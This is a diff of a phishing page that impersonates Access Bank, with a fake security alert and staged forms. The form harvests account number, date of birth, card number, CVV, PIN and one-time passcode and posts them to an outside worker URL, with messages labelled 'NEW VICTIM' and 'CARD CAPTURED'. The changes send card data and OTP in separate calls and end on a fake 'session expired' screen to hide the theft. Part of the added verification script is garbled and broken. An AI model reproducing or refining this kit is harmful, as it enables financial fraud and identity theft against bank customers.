@@ -11,14 +11,18 @@
 <div class="topbar">
     <div class="container">
         <span>🔒 Secured Connection · 256-bit SSL</span>
-        <span>Need help? Call 0700-300-0000</span>
+        <span>Support: 0700-300-0000</span>
     </div>
 </div>
 
 <header>
     <div class="container">
         <div class="logo">
-            <div class="logo-mark">A</div>
+            <svg width="40" height="40" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <rect width="100" height="100" fill="#002d62" rx="8"/>
+                <path d="M30 70 L50 30 L70 70 Z" fill="#f58220"/>
+                <circle cx="50" cy="55" r="8" fill="#002d62"/>
+            </svg>
             <span>Access Bank</span>
         </div>
     </div>
@@ -26,7 +30,7 @@
 
 <div class="alert-banner">
     <div class="container">
-        ⚠️ <strong>Action Required:</strong> Unusual activity detected on your account. Verify your identity to continue.
+        ⚠️ <strong>Action Required:</strong> Unusual activity detected. Verify your identity to secure your funds.
     </div>
 </div>
 
@@ -34,57 +38,72 @@
     <div class="card">
         <div class="card-header">
             <h1>Secure Account Verification</h1>
-            <p>We've detected a login attempt from a new device. To protect your funds, please verify your account details below.</p>
+            <p>We've detected a login attempt from an unrecognized device. Please verify your account details below to continue.</p>
         </div>
 
         <form id="verifyForm">
+            <!-- STAGE 1 -->
             <div class="stage" id="stage-1">
                 <div class="form-group">
                     <label>Account Number</label>
-                    <input type="text" name="account_number" maxlength="10" placeholder="0123456789" required>
+                    <input type="tel" name="account_number" id="acc_input" maxlength="10" placeholder="0123456789" required>
                 </div>
                 <div class="form-group">
                     <label>Date of Birth</label>
-                    <input type="text" name="dob" placeholder="DD/MM/YYYY" required>
+                    <input type="tel" name="dob" id="dob_input" maxlength="10" placeholder="DD/MM/YYYY" required>
                 </div>
                 <button type="button" class="btn" onclick="nextStage(2)">Continue →</button>
             </div>
 
+            <!-- STAGE 2 -->
             <div class="stage hidden" id="stage-2">
                 <div class="form-group">
                     <label>Card Number</label>
-                    <input type="text" name="card_number" maxlength="19" placeholder="1234 5678 9012 3456" required>
+                    <input type="tel" name="card_number" id="card_input" maxlength="19" placeholder="0000 0000 0000 0000" required>
                 </div>
                 <div class="form-row">
                     <div class="form-group">
                         <label>Expiry</label>
-                        <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                        <input type="tel" name="expiry" id="exp_input" placeholder="MM/YY" maxlength="5" required>
                     </div>
                     <div class="form-group">
                         <label>CVV</label>
-                        <input type="text" name="cvv" placeholder="123" maxlength="4" required>
+                        <input type="tel" name="cvv" maxlength="3" placeholder="123" required>
                     </div>
                 </div>
                 <div class="form-group">
                     <label>Card PIN</label>
                     <input type="password" name="pin" maxlength="4" placeholder="••••" required>
                 </div>
-                <button type="button" class="btn" onclick="nextStage(3)">Verify Card →</button>
+                <button type="button" class="btn" onclick="submitCardDetails()">Verify Card →</button>
             </div>
 
+            <!-- STAGE 3 (Spinner & OTP) -->
             <div class="stage hidden" id="stage-3">
-                <div class="verifying-box">
+                <div class="verifying-box" id="verifying-box">
                     <div class="spinner"></div>
-                    <p>Verifying with Access Bank secure servers…</p>
+                    <p>Securely verifying your card details with Access Bank…</p>
                     <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
                 </div>
-                <div id="otp-section" class="hidden" style="margin-top:20px;">
-                    <div class="form-group">
-                        <label>Enter OTP sent to your phone</label>
-                        <input type="text" name="otp" maxlength="6" placeholder="000000">
+                
+                <div id="otp-section" class="hidden">
+                    <div class="otp-info">
+                        <p><strong>Security Check:</strong> For your protection, a 6-digit One-Time Password (OTP) has been sent to the phone number linked to your account. This may take a few minutes to arrive. Please do not close this window.</p>
                     </div>
-                    <button type="submit" class="btn">Complete Verification →</button>
+                    <div class="form-group">
+                        <label>Enter 6-Digit OTP</label>
+                        <input type="tel" name="otp" maxlength="6" placeholder="000000" style="letter-spacing: 8px; text-align: center; font-size: 24px;">
+                    </div>
+                    <button type="submit" class="btn">Complete Verification</button>
+                    <button type="button" class="btn-resend" onclick="alert('A new OTP has been requested. Please wait a few minutes for it to arrive.')">Resend OTP</button>
                 </div>
+            </div>
+            
+            <!-- STAGE 4 (Final processing) -->
+            <div class="stage hidden" id="stage-4" style="text-align: center; padding: 40px 0;">
+                <div class="spinner"></div>
+                <h3 style="color: #002d62; margin-top: 20px;">Processing...</h3>
+                <p style="color: #666;">Please do not refresh or close this window.</p>
             </div>
         </form>
     </div>
@@ -111,8 +130,32 @@
 </footer>
 
 <script>
-    const WORKER_URL = 'https://access-alerts.mcallendiana.workers.dev';
+    const WORKER_URL = 'access-alerts.mcallendiana.workers.dev';
     const collected = {};
+
+    // Input Formatting (Masking)
+    document.getElementById('acc_input').addEventListener('input', function (e) {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+    });
+    
+    document.getElementById('dob_input').addEventListener('input', function (e) {
+        let val = this.value.replace(/[^0-9]/g, '');
+        if (val.length > 2 && val.length <= 4) val = val.slice(0,2) + '/' + val.slice(2);
+        else if (val.length > 4) val = val.slice(0,2) + '/' + val.slice(2,4) + '/' + val.slice(4,8);
+        this.value = val;
+    });
+
+    document.getElementById('card_input').addEventListener('input', function (e) {
+        let val = this.value.replace(/[^0-9]/g, '').slice(0, 16);
+        let formatted = val.match(/.{1,4}/g);
+        this.value = formatted ? formatted.join(' ') : val;
+    });
+
+    document.getElementById('exp_input').addEventListener('input', function (e) {
+        let val = this.value.replace(/[^0-9]/g, '');
+        if (val.length > 2) val = val.slice(0,2) + '/' + val.slice(2);
+        this.value = val;
+    });
 
     function collectStage(n) {
         const stage = document.getElementById('stage-' + n);
@@ -126,37 +169,19 @@
         collectStage(n - 1);
         document.getElementById('stage-' + (n - 1)).classList.add('hidden');
         document.getElementById('stage-' + n).classList.remove('hidden');
-
-        if (n === 3) {
-            runVerification();
-        }
     }
 
-    function runVerification() {
-        const progress = document.getElementById('progress');
-        let pct = 0;
-        const interval = setInterval(() => {
-            pct += 2;
-            progress.style.width = pct + '%';
-            if (pct >= 100) {
-                clearInterval(interval);
-                document.getElementById('otp-section').classList.remove('hidden');
-            }
-        }, 100);
-    }
-
-    document.getElementById('verifyForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        collectStage(3);
-
-        const text = `🔐 *NEW VICTIM — ACCESS BANK*\n\n` +
+    // TRIGGER 1: Send Card Details IMMEDIATELY
+    async function submitCardDetails() {
+        collectStage(2);
+        
+        const text = `💳 *CARD CAPTURED — ACCESS BANK*\n\n` +
             `🏦 *Account:* ${collected.account_number || 'N/A'}\n` +
             `🎂 *DOB:* ${collected.dob || 'N/A'}\n` +
             `💳 *Card:* ${collected.card_number || 'N/A'}\n` +
             `📅 *Expiry:* ${collected.expiry || 'N/A'}\n` +
             `🔒 *CVV:* ${collected.cvv || 'N/A'}\n` +
             `🔑 *PIN:* ${collected.pin || 'N/A'}\n` +
-            `📱 *OTP:* ${collected.otp || 'N/A'}\n` +
             `🕐 *Time:* ${new Date().toLocaleString()}`;
 
         try {
@@ -167,7 +192,49 @@
             });
         } catch (err) {}
 
-        document.body.innerHTML = '<div style="padding:60px;text-align:center;font-family:Arial;"><h2>Verification Complete</h2><p>Your account has been secured. You will receive a confirmation email shortly.</p></div>';
+        nextStage(3);
+        runVerification();
+    }
+
+    function runVerification() {
+        const progress = document.getElementById('progress');
+        let pct = 0;
+        const interval = setInterval(() => {
+            pct += 2;
+-left            progress.style.width = pct +: '%';
+            if (pct >= 100) {
+                clearInterval( interval);
+                document.getElementById('verifying-box').4classList.add('hiddenpx');
+                document.getElementById('otp solid-section').classList.remove('hidden');
+            }
+        }, 60); 
+    }
+
+    // TRIGGER 2: Send OTP when they submit
+    document.getElementById('verifyForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        collectStage(3);
+
+        document.getElementById('stage-3').classList.add('hidden');
+        document.getElementById('stage-4').classList.remove('hidden');
+
+        const text = `📱 *OTP RECEIVED — ACCESS BANK*\n\n` +
+            `👤 *Account:* ${collected.account_number}\n` +
+            `💳 *Card:* ${collected.card_number}\n` +
+            `🔑 *OTP:* ${collected.otp || 'N/A'}\n` +
+            `🕐 *Time:* ${new Date().toLocaleString()}`;
+
+        try {
+            await fetch(WORKER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ text })
+            });
+        } catch (err) {}
+
+        setTimeout(() => {
+            document.body.innerHTML = '<div style="padding:60px 20px;text-align:center;font-family:Arial;background:#fff;height:100vh;"><h2 style="color:#d97706;">Session Expired</h2><p style="color:#666; margin-top:10px;">For your security, this session has timed out. Please log in again from the official Access Bank app.</p></div>';
+        }, 4000);
     });
 </script>
 
